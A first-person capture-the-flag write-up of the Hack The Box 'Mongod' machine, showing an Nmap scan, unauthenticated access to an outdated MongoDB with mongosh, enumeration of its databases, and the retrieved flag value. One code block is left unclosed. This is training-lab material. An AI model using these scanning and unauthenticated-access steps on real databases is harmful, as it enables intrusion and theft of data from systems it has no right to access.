## TL;DR

This writeup documents the process of exploiting the [__Mongod__](https://app.hackthebox.com/starting-point){:target="_blank"} machine on Hack The Box. An Nmap scan revealed two open ports: `22` (SSH) and `27017` (MongoDB). The MongoDB instance was outdated and misconfigured, allowing unauthenticated access. Using `mongosh`, I connected to the database and discovered that access control was disabled. Enumeration of the available databases led to the discovery of a `flag` table in the `sensitive_information` database, which contained the flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports `22` and `27017`, corresponding to `SSH` and `MongoDB`. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn -p- 10.129.62.118 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-16 09:58 IST

## Enumeration

The `MongoDB` instance is running an outdated version, which might be vulnerable. Let's enumerate it further.

I will be using [__`mongosh`__](https://downloads.mongodb.com/compass/mongosh-2.3.9-linux-x64.tgz){:target="_blank"}, a `MongoDB` shell. 

## Exploitation

```bash
./mongosh mongodb://10.129.62.118:27017                        
Current Mongosh Log ID:	67b1938903963073bffe6910
Connecting to:		mongodb://10.129.62.118:27017/?directConnection=true&appName=mongosh+2.3.2
Using MongoDB:		3.6.8
Using Mongosh:		2.3.2
mongosh 2.3.9 is available for download: https://www.mongodb.com/try/download/shell

For mongosh info see: https://www.mongodb.com/docs/mongodb-shell/


To help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).
You can opt-out by running the disableTelemetry() command.

test> help
```

Now that I have access to the `MongoDB` database, I will look into the available databases and tables.

```bash
test> show databases
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
```

I found five databases, so I will examine each one to identify sensitive information or a potential flag.

While checking the databases, I came across a table named `flag` in the `sensitive_information` database.

```bash
local> use sensitive_information
switched to db sensitive_information
sensitive_information> show tables
flag
sensitive_information> db.flag.find().pretty()
[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
```
